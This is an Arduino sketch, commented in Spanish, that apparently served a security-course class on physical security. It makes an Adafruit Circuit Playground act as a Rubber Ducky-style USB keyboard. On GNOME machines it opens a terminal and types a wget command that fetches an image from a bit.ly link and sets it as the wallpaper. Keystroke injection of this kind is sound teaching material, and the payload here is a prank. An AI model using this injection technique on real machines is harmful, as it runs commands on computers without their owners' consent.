// Playground Ducky
//
// Inspirado en el funcionamiento del Rubber Ducky, se utiliza un Adafruit Circuit Playground
// con ATMega 32u4 con capacidad de emular teclado y mouse USB
// El ataque ha sido personalizado para las estaciones de trabajo de Greencore Solutions
// para el curso de Seguridad Informática, clase de Seguridad Física



#include <Adafruit_CircuitPlayground.h>
#include <Wire.h>
#include <SPI.h>
#include <Keyboard.h>

void setup() {
  CircuitPlayground.begin(); // Iniciamos funciones del Playground, necesario para luces más adelante
  if (CircuitPlayground.slideSwitch()) {
    Keyboard.begin();          // Iniciamos funcionalidad de teclado
    delay(1000);               // Esperamos un segundo a que el equipo nos registre como teclado
    Keyboard.write(0x83);      // Caracter de "KEY_LEFT_GUI"
    delay(1300);               // Algunos basados en Gnome se toman su tiempo
    Keyboard.write(0xB0);      // Enter nos lleva a escribir
    delay(1000);
    Keyboard.print("terminal");// Abrimos una terminal
    Keyboard.write(0xB0);      // Y damos enter
    delay(1000);
    Keyboard.print("wget -O tele.jpg http://bit.ly/2c7nVwO && gsettings set org.gnome.desktop.background picture-uri file://$(pwd)/tele.jpg && exit");
    Keyboard.write(0xB0);      // Fondo de los teletubies, castigo de Alf Delgado en FuerzaG :)
    Keyboard.println("");
    Keyboard.end();
  }
}

void loop() {
    // Luego del ataque, distraemos con luces y colores
    uint32_t offset = millis() / 5;
    for(int i=0; i<10; ++i) {
      CircuitPlayground.strip.setPixelColor(i, CircuitPlayground.colorWheel(((i * 256 / 10) + offset) & 255));
    }
    // Show all the pixels.
    CircuitPlayground.strip.show();
}


